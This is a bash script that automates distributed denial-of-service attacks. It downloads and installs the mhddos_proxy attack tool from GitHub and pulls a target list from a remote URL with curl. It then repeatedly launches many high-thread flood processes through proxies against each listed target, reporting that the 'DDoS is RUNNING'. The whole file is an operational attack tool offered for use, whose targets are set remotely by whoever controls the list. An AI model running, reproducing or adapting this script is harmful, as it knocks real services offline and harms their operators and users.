#!/bin/bash

# More safety, by turning some bugs into errors.
# Without `errexit` you don’t need ! and can replace
# PIPESTATUS with a simple $?, but I don’t do that.
set -o errexit -o pipefail -o noclobber -o nounset

# -allow a command to fail with !’s side effect on errexit
# -use return value from ${PIPESTATUS[0]}, because ! hosed $?
! getopt --test > /dev/null
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo 'I am sorry, `getopt --test` failed in this environment. Please, install enhanced getopt.'
    exit 1
fi

OPTIONS=r:t:p:s:u:
LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,url-with-targets:

# -regarding ! and PIPESTATUS see above
# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    # e.g. return value is 1
    #  then getopt has complained about wrong arguments to stdout
    exit 2
fi

# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

refresh_interval="15m"
thread_count="1000"
process_count="5"
stats_interval="30"
url_with_targets="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"

# now enjoy the options in order and nicely split until we see --
while true; do
    case "$1" in
        -r|--refresh-interval)
            refresh_interval="$2"
            shift 2
            ;;
        -t|--thread-count)
            thread_count="$2"
            shift 2
            ;;
        -p|--process-count)
            process_count="$2"
            shift 2
            ;;
        -s|--stats-interval)
            stats_interval="$2"
            shift 2
            ;;
        -u|--url-with-targets)
            url_with_targets="$2"
            shift 2
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "$1"
            echo "Programming error"
            exit 3
            ;;
    esac
done

PROXY_PROJECT_NAME=mhddos_proxy
PROXY_PROJECT_VERSION=d3700c0538a3b76944a54c968ccdc88b71016a4d

PROXY_DIR=~/$PROXY_PROJECT_NAME
PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt

# delete old proxy dir if present
if [ -d $PROXY_DIR ]; then
    rm -r $PROXY_DIR &> /dev/null
fi

git clone https://github.com/porthole-ascend-cinnamon/$PROXY_PROJECT_NAME.git &> /dev/null
cd $PROXY_DIR
git checkout $PROXY_PROJECT_VERSION &> /dev/null
python3 -m pip install -r requirements.txt &> /dev/null

# Restart attacks and update targets every $refresh_interval
while true
do
    # kill old copies of mhddos_proxy
    echo -e "\nDDoS is (RE)STARTING. Killing old processes..."
    if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
    if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
    if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
    echo -e "\nDDoS is (RE)STARTING. Killing old processes... DONE!"

    # delete old proxy file if present
    if [ -f $PROXY_FILE ]; then
        rm $PROXY_FILE
    fi

    # load targets and process them one-by-one
    curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
      for (( i=1; i<=process_count; i++ ))
      do
          echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&"

          cd $PROXY_DIR
          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&

          # wait till the first process initializes proxy file properly
          if [ ! -f $PROXY_FILE ]; then
              echo -e "\nWaiting for proxies initialization. This might take several minutes..."

              while [ ! -f $PROXY_FILE ]
              do
                  sleep 1
              done

              echo -e "\nWaiting for proxies initialization. This might take several minutes... DONE!"
          fi
      done
  done

  ifstat -i eth0 -t -b $stats_interval/$stats_interval&

  echo -e "\nDDoS is RUNNING. Next update of targets list in $refresh_interval\nDDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n\n"

  sleep $refresh_interval
  clear

done
